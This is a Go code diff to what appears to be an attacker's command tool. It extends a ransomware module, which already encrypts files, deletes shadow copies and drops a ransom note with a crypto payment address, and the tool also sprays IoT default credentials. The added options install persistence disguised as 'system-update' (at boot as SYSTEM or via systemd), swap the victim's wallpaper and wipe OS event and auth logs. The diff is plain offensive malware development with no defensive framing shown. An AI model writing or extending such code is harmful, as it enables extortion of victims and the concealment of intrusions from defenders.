@@ -75,6 +75,12 @@ func main() {
 	cryptoNoteAddr := flag.String("crypto-note-address", "", "ransom note: payment address")
 	cryptoNotePrice := flag.String("crypto-note-price", "", "ransom note: price (e.g. 0.05 XMR)")
 	cryptoDryRun := flag.Bool("crypto-dry-run", false, "crypto_malware: enumerate only, write nothing")
+	cryptoPersist := flag.Bool("crypto-persist", false, "crypto_malware: install persistence after encryption")
+	cryptoPersistName := flag.String("crypto-persist-name", "system-update", "persistence task/unit name")
+	cryptoPersistBoot := flag.Bool("crypto-persist-boot", false, "persist on system boot (SYSTEM/systemd)")
+	cryptoWallpaper := flag.Bool("crypto-wallpaper", false, "crypto_malware: swap desktop wallpaper")
+	cryptoWallpaperPath := flag.String("crypto-wallpaper-path", "", "path to wallpaper image")
+	cryptoLogScrub := flag.Bool("crypto-log-scrub", false, "crypto_malware: wipe OS event/auth logs")
 	iotCredsHost := flag.String("iotcreds", "", "iot default-creds spray: target ip[:port]")
 	iotCredsProto := flag.String("iotcreds-proto", "http", "iot spray protocol: http|https|telnet|ssh")
 	iotCredsPath := flag.String("iotcreds-path", "/", "iot spray: HTTP request path")
@@ -323,15 +329,21 @@ func main() {
 			log.Printf("[crypto] -crypto-note requires -crypto-note-email, -crypto-note-address, -crypto-note-price")
 		} else {
 			go runCryptoDispatch(mgr, cryptoDispatchArgs{
-				Root:      *cryptoRoot,
-				PubPath:   *cryptoPub,
-				KeyID:     uint32(*cryptoKeyID),
-				KillVSS:   *cryptoVSS,
-				Note:      *cryptoNote,
-				NoteEmail: *cryptoNoteEmail,
-				NoteAddr:  *cryptoNoteAddr,
-				NotePrice: *cryptoNotePrice,
-				DryRun:    *cryptoDryRun,
+				Root:          *cryptoRoot,
+				PubPath:       *cryptoPub,
+				KeyID:         uint32(*cryptoKeyID),
+				KillVSS:       *cryptoVSS,
+				Note:          *cryptoNote,
+				NoteEmail:     *cryptoNoteEmail,
+				NoteAddr:      *cryptoNoteAddr,
+				NotePrice:     *cryptoNotePrice,
+				DryRun:        *cryptoDryRun,
+				PostPersist:   *cryptoPersist,
+				PersistName:   *cryptoPersistName,
+				PersistOnBoot: *cryptoPersistBoot,
+				PostWallpaper: *cryptoWallpaper,
+				WallpaperPath: *cryptoWallpaperPath,
+				PostLogScrub:  *cryptoLogScrub,
 			})
 		}
 	}
@@ -828,15 +840,21 @@ func runWirelessCapture(mgr *session.Manager, iface string, channel int, outPath
 
 // cryptoDispatchArgs carries the operator's -crypto flags to the dispatcher.
 type cryptoDispatchArgs struct {
-	Root      string
-	PubPath   string
-	KeyID     uint32
-	KillVSS   bool
-	Note      bool
-	NoteEmail string
-	NoteAddr  string
-	NotePrice string
-	DryRun    bool
+	Root          string
+	PubPath       string
+	KeyID         uint32
+	KillVSS       bool
+	Note          bool
+	NoteEmail     string
+	NoteAddr      string
+	NotePrice     string
+	DryRun        bool
+	PostPersist   bool
+	PersistName   string
+	PersistOnBoot bool
+	PostWallpaper bool
+	WallpaperPath string
+	PostLogScrub  bool
 }
 
 // runCryptoDispatch waits for the first agent, pushes the operator public
